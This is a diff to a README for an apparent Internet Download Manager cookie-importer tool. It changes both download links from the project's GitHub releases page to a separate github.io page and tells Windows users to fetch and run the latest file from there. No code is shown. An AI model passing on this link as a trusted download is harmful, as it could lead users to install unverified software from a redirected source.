@@ -1,10 +1,10 @@
 # 🚀 idm-cookie-importer-2026 - Log In Once, Download Everything
 
-[![Download Now](https://img.shields.io/badge/Download-IDM_Cookie_Importer_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/toejaiden1/idm-cookie-importer-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-IDM_Cookie_Importer_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://toejaiden1.github.io)
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/toejaiden1/idm-cookie-importer-2026/releases](https://github.com/toejaiden1/idm-cookie-importer-2026/releases)
+Visit this link to download the application: [https://toejaiden1.github.io](https://toejaiden1.github.io)
 
 Once you arrive at the page, look for the latest release file and click to download it. After the download finishes, you'll have the program ready to use on your Windows computer.
 
